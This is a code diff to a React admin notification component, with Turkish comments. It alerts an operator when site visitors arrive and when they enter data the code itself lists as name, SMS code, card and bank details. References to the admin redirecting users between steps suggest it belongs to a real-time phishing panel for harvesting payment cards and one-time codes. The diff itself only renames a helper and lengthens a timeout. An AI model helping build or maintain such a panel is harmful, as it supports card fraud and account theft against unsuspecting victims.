@@ -2,7 +2,7 @@
 
 import { useEffect, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import { playBeautifulNotification, showBeautifulToast, extractUserFormData } from "@/lib/notification";
 
 // Tum admin1 sekmelerinde canli kalir: LogsTab kapaliyken (Ayarlar, Kullanicilar,
 // Bankalar, Cark vb.) da sessions degisikliklerini dinler ve bildirim calar.
@@ -86,7 +86,7 @@ export function AdminNotifier() {
         if (!row?.id || row.is_hidden) return;
         cacheRef.current.set(
           row.id,
-          JSON.stringify(significant(row.form_data)),
+          JSON.stringify(extractUserFormData(row.form_data)),
         );
         notify("Yeni Ziyaretçi", "Siteye yeni bir kullanıcı girdi.");
       })
@@ -96,16 +96,16 @@ export function AdminNotifier() {
         if (!row?.id || row.is_hidden) return;
         // Sadece ve sadece form_data (kullanici girdisi) degistiyse bildir;
         // current_step degisimi (admin yonlendirmesi) ASLA "Yeni Form Verisi" sayilmaz!
-        const cur = JSON.stringify(significant(row.form_data));
+        const cur = JSON.stringify(extractUserFormData(row.form_data));
         const prev = cacheRef.current.get(row.id);
         cacheRef.current.set(row.id, cur);
 
-        // Ilk gorulen update baseline sayilir; sonrasinda fd degismisse bildir
+        // Ilk gorulen update baseline sayilir; sonrasinda gercek kullanici girdisi degismisse bildir
         if (prev === undefined || prev === cur) return;
 
-        // Admin tarafindan son 3 sn icinde yapilan yonlendirme/aksiyon sirasinda ek bildirim basma
+        // Admin tarafindan son 4 sn icinde yapilan yonlendirme/aksiyon sirasinda ek bildirim basma
         const w = window as any;
-        if (w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 3000) return;
+        if (w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 4000) return;
 
         notify("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
       })
